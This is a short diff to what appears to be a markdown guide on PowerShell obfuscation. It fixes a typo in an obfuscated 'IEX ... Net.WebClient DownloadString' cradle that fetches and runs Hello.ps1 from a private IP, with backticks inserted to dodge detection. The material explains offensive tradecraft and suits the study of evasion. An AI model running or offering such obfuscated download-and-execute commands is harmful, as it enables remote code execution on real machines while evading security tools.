@@ -523,7 +523,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 - String obfuscated<br />
 
-      I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.16`8.1`.71/He`ll`o.ps`1")' -f'Ne','Download','http://)
+      I`E`X ('({0}w-Object {0}t.WebClient).{1}String("{2}19`2.16`8.1`.71/He`ll`o.ps`1")' -f'Ne','Download','http://)
 
 ![powershell obfuscation](http://i.cubeupload.com/p9j54c.jpg)
 
